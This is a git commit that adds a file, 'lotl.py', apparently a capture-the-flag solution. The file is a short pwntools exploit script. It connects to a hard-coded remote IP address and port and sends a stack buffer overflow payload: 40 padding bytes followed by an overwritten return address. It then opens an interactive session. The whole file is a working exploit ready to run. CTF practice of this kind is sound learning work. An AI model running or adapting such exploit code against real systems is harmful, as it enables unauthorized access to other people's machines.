366999d78810bd24658169369cacc88246d04769
cartoon-raccoon <shaughn.chan@gmail.com>
2021-04-15 22:20:56 +0800

    Added lotl entry

---
+++ level5/Lotl/lotl.py
@@ -0,0 +1,10 @@
+from pwn import *
+
+conn = remote("46.101.107.117", 2102)
+
+conn.recvuntil(b'> ')
+
+string = b"A"*40 + b"\x6e\x08\x40\x00\x00\x00\x00\x00"
+
+conn.send(string)
+conn.interactive()
